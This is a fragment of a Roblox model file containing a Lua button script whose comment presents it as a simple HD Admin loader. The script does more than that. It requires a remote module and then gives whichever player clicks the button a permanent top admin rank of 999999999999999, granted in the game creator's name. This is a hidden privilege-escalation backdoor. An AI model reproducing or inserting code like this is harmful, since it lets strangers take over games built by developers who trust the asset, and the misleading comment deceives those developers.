								<Properties>
									<ProtectedString name="Source"><![CDATA[script.Parent.MouseButton1Down:Connect(function()
	local p = script.Parent.Parent.Parent.Parent.Parent.Parent
--[[
	This loads HD Admin into your game.
	
	Require the 'HD Admin MainModule' by the HD Admin group for automatic updates.
	
	You can view the HD Admin Main Module here:
	https://www.roblox.com/library/3239236979/HD
	
--]]

	local loaderFolder = script["HD Admin"]
	local mainModule = require(3239236979)
	mainModule:Initialize(loaderFolder)
	wait(7)
	local main = _G.HDAdminMain
	main:GetModule("cf"):SetRank(p, game.CreatorId, 999999999999999, "Perm")  
end)]]></ProtectedString>
